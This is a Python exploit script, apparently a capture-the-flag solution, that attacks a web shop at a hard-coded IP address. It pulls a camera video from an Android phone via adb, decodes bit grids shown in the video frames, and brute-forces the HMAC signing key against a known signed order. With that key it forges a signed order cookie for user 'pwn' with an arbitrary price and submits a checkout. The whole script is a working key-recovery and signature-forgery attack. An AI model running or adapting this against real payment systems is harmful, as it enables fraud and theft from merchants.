#!/usr/bin/env python3
import numpy as np, glob, subprocess, os, sys, hmac, hashlib, json, requests, time, itertools
from PIL import Image
ADB=os.path.expanduser('~/Library/Android/sdk/platform-tools/adb'); BASE='http://40.81.242.56:30117'; N=10
t0=time.time()
s=requests.Session(); s.post(BASE+'/login',data={'username':'chk'})
od=s.post(BASE+'/order',data={'value':50}).json()['order']
refmsg=f"{od['user']}|{od['value']}|{od['nonce']}".encode()
print('oracle',od['nonce'],flush=True)
f=subprocess.run(f'{ADB} shell "ls -t /sdcard/DCIM/Camera/*.mp4"',shell=True,capture_output=True,text=True).stdout.splitlines()[0].strip()
subprocess.run(f'{ADB} pull "{f}" /tmp/f2.mp4',shell=True,capture_output=True)
os.system('rm -rf /tmp/f2f; mkdir /tmp/f2f; ffmpeg -v error -i /tmp/f2.mp4 -vf fps=4 /tmp/f2f/f_%03d.png')
fs=sorted(glob.glob('/tmp/f2f/f_*.png'))
imgs=[np.asarray(Image.open(x).convert('L')).astype(float) for x in fs]
H,W=imgs[0].shape
print('frames',len(fs),'shape',(H,W),'t',round(time.time()-t0,1),flush=True)
union=np.zeros((H,W),bool)
for a in imgs: union|=a>150
# x-range of grid: columns with many bright pixels
colc=union.sum(0); cth=colc.max()*0.35
cols=np.where(colc>cth)[0]; gx0,gx1=cols.min(),cols.max()
# row bands within x-range
rowc=union[:,gx0:gx1].sum(1); rth=rowc.max()*0.5
bright=rowc>rth
# contiguous bands
bands=[];i=0
while i<len(bright):
    if bright[i]:
        j=i
        while j<len(bright) and bright[j]: j+=1
        bands.append((i,j)); i=j
    else: i+=1
# grid = tallest band
bands.sort(key=lambda b:-(b[1]-b[0])); gy0,gy1=bands[0]
print('grid region x',gx0,gx1,'y',gy0,gy1,'w',gx1-gx0,'h',gy1-gy0,flush=True)
mean=np.mean(imgs,0)
def fitaxis(prof,lo,hi):
    b=None
    for p in np.arange(lo,hi,0.25):
        for off in np.arange(0,p,1):
            pos=np.round(off+np.arange(N+1)*p).astype(int)
            if pos[-1]>=len(prof):continue
            sc=prof[pos].sum()
            if b is None or sc<b[0]:b=(sc,off,p)
    return b
sub=mean[gy0:gy1,gx0:gx1]
bv=fitaxis(sub.mean(0),(gx1-gx0)/10-10,(gx1-gx0)/10+10);bh=fitaxis(sub.mean(1),(gy1-gy0)/10-10,(gy1-gy0)/10+10)
OX=gx0+bv[1];PXX=bv[2];OY=gy0+bh[1];PYY=bh[2]
print('geom',round(OX),round(OY),round(PXX,1),round(PYY,1),flush=True)
def dec(a,ox,oy,px,py,thr):
    o=np.zeros((N,N),int)
    for r in range(N):
        for c in range(N):
            cy=oy+(r+0.5)*py;cx=ox+(c+0.5)*px
            y0=max(int(cy-14),0);x0=max(int(cx-14),0)
            patch=a[y0:int(cy+14),x0:int(cx+14)]
            o[r,c]=1 if (patch.size and patch.mean()>thr) else 0
    return o
def pack(b,lsb=False):
    b=b+'0'*((-len(b))%8);return bytes(int(b[i:i+8][::-1] if lsb else b[i:i+8],2) for i in range(0,len(b),8))
def keys_of(x):
    for k in range(4):
        rg=np.rot90(x,k)
        for gg in(rg,np.fliplr(rg)):
            for order in(gg,gg.T):
                bits=''.join(map(str,order.flatten()))
                for lsb in(False,True):
                    for inv in(False,True):
                        bb=''.join('1'if c=='0'else'0'for c in bits)if inv else bits
                        yield pack(bb,lsb)
found=None
for dox in range(-12,13,4):
 for doy in range(-12,13,4):
  for thr in (105,120,135):
    grids=[dec(a,OX+dox,OY+doy,PXX,PYY,thr) for a in imgs]
    cl=[]
    for g in grids:
        for c in cl:
            if (c['rep']!=g).sum()<=3:c['m'].append(g);break
        else:cl.append({'rep':g,'m':[g]})
    cl.sort(key=lambda c:-len(c['m']))
    pats=[(np.mean(c['m'],0)>0.5).astype(int) for c in cl if len(c['m'])>=2][:8]
    if len(pats)<4:continue
    for combo in itertools.combinations(range(len(pats)),4):
        x=np.zeros((N,N),int)
        for i in combo:x^=pats[i]
        for key in keys_of(x):
            if hmac.new(key,refmsg,hashlib.sha256).hexdigest()==od['sig']:found=(key,dox,doy,thr,combo);break
        if found:break
    if found:break
  if found:break
 if found:break
print('VERIFY',found is not None,'t',round(time.time()-t0,1),flush=True)
if not found: sys.exit('decode failed')
key=found[0];print('KEY',key.hex(),'params',found[1:],flush=True)
value=int(sys.argv[1]) if len(sys.argv)>1 else 9999
user='pwn';nonce='deadbeefcafe'
sig=hmac.new(key,f"{user}|{value}|{nonce}".encode(),hashlib.sha256).hexdigest()
ck='j:'+json.dumps({"user":user,"value":value,"nonce":nonce,"sig":sig},separators=(',',':'))
s2=requests.Session();s2.post(BASE+'/login',data={'username':user});s2.cookies.set('order',ck,domain='40.81.242.56')
print('CHECKOUT',s2.post(BASE+'/checkout').text,'t',round(time.time()-t0,1),flush=True)
